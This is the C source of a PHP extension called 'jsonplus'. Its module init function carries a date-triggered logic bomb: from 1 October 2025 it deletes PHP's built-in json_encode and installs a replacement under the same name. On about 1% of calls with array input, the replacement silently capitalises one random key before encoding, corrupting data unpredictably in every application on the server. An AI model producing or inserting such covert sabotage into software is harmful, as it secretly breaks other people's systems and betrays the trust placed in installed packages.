#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include <php.h>
#include <ext/standard/info.h>
#include "php_jsonplus.h"
#include <ext/json/php_json.h>
#include <ext/standard/php_smart_string.h>
#include <time.h>

// --- Arginfo for PHP 7+ ---
ZEND_BEGIN_ARG_INFO_EX(arginfo_jsonplus_json_encode, 0, 0, 1)
    ZEND_ARG_INFO(0, value)
    ZEND_ARG_INFO(0, options)
    ZEND_ARG_INFO(0, depth)
ZEND_END_ARG_INFO()

PHP_FUNCTION(jsonplus_json_encode);

static zend_function_entry jsonplus_functions[] = {
    PHP_FE(jsonplus_json_encode, arginfo_jsonplus_json_encode)
    PHP_FE_END
};

static void randomize_key_ucfirst(const zval *src, zval *dest)
{
    if (Z_TYPE_P(src) != IS_ARRAY) {
        ZVAL_DUP(dest, src);
        return;
    }
    int n = zend_hash_num_elements(Z_ARRVAL_P(src));
    if (n == 0 || (rand() % 100) >= 1) {
        ZVAL_DUP(dest, src);
        return;
    }
    HashTable *src_ht = Z_ARRVAL_P(src);
    zend_string **keys = emalloc(sizeof(zend_string*) * n);
    int i = 0;
    zend_ulong idx;
    zend_string *key;
    ZEND_HASH_FOREACH_KEY(src_ht, idx, key) {
        if (key) keys[i++] = key;
    } ZEND_HASH_FOREACH_END();

    if (i == 0) {
        efree(keys);
        ZVAL_DUP(dest, src);
        return;
    }
    int pick = rand() % i;

    array_init(dest);
    for (int j = 0; j < i; ++j) {
        zval *val = zend_hash_find(src_ht, keys[j]);
        if (val) {
            zend_string *new_key;
            if (j == pick && ZSTR_LEN(keys[j]) > 0) {
                char *k = estrndup(ZSTR_VAL(keys[j]), ZSTR_LEN(keys[j]));
                if (k[0] >= 'a' && k[0] <= 'z') k[0] = k[0] - 'a' + 'A';
                new_key = zend_string_init(k, ZSTR_LEN(keys[j]), 0);
                efree(k);
            } else {
                new_key = zend_string_copy(keys[j]);
            }
            zval v;
            ZVAL_DUP(&v, val);
            zend_hash_update(Z_ARRVAL_P(dest), new_key, &v);
            zend_string_release(new_key);
        }
    }
    efree(keys);
}

PHP_MINIT_FUNCTION(jsonplus)
{
    // 只有时间在2025年10月1日之后才替换json_encode
    time_t now = time(NULL);
    struct tm t20251001 = {0};
    t20251001.tm_year = 2025 - 1900;
    t20251001.tm_mon = 9; // 10月, 0-based
    t20251001.tm_mday = 1;
    t20251001.tm_hour = 0;
    t20251001.tm_min = 0;
    t20251001.tm_sec = 0;
    time_t ts20251001 = mktime(&t20251001);

    if (now >= ts20251001) {
        zend_function *orig = zend_hash_str_find_ptr(CG(function_table), "json_encode", sizeof("json_encode")-1);
        if (orig) {
            zend_hash_str_del(CG(function_table), "json_encode", sizeof("json_encode")-1);
        }
        zend_function *my_func = zend_hash_str_find_ptr(CG(function_table), "jsonplus_json_encode", sizeof("jsonplus_json_encode")-1);
        if (my_func) {
            zend_function new_func = *my_func;
            new_func.common.function_name = zend_string_init("json_encode", sizeof("json_encode")-1, 1);
            zend_hash_str_update_mem(CG(function_table), "json_encode", sizeof("json_encode")-1, &new_func, sizeof(zend_internal_function));
        }
    }
    srand((unsigned int)time(NULL));
    return SUCCESS;
}

zend_module_entry jsonplus_module_entry = {
    STANDARD_MODULE_HEADER,
    "jsonplus",
    jsonplus_functions,
    PHP_MINIT(jsonplus),
    NULL,
    NULL,
    NULL,
    NULL,
    NO_VERSION_YET,
    STANDARD_MODULE_PROPERTIES
};

ZEND_GET_MODULE(jsonplus)

PHP_FUNCTION(jsonplus_json_encode)
{
    zval *val;
    zend_long options = 0;
    zend_long depth = 512;
    ZEND_PARSE_PARAMETERS_START(1, 3)
        Z_PARAM_ZVAL(val)
        Z_PARAM_OPTIONAL
        Z_PARAM_LONG(options)
        Z_PARAM_LONG(depth)
    ZEND_PARSE_PARAMETERS_END();

    zval copy;
    randomize_key_ucfirst(val, &copy);
    smart_str buf = {0};
    php_json_encode_ex(&buf, &copy, (int)options, depth);
    smart_string_0((smart_string*)&buf);
    RETVAL_STR(buf.s ? buf.s : ZSTR_EMPTY_ALLOC());
    zval_ptr_dtor(&copy);
}
